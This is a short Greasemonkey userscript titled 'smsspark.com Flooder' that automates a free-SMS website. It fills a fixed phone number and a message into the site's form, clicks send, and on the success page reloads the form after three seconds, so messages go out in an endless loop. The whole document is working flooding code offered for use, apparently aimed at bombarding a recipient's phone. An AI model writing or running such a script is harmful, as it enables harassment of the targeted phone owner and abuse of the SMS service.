// ==UserScript==
// @name          smsspark.com Flooder By ramanxXx
// @namespace     http://Paplu.net
// @description   basic Greasemonkey script
// @include        http://*smsspark.com/quick_sms.php
// @include        http://*smsspark.com/submit_success.php?mob=9999999999
// @include        http://*smsspark.com*
// ==/UserScript==


var code;
if(document.location=="http://smsspark.com/quick_sms.php"||document.location=="http://smsspark.com/quick_sms.php")
{

document.getElementById('txt_Number').value=9999999999;

code=':D ';


document.getElementById('txtMessage').value=code;
void(0);
document.getElementById('btnSend').click();
}

if(document.location=="http://smsspark.com/submit_success.php?mob=9999999999")
{
setTimeout('document.location="http://smsspark.com/quick_sms.php"',3000);
}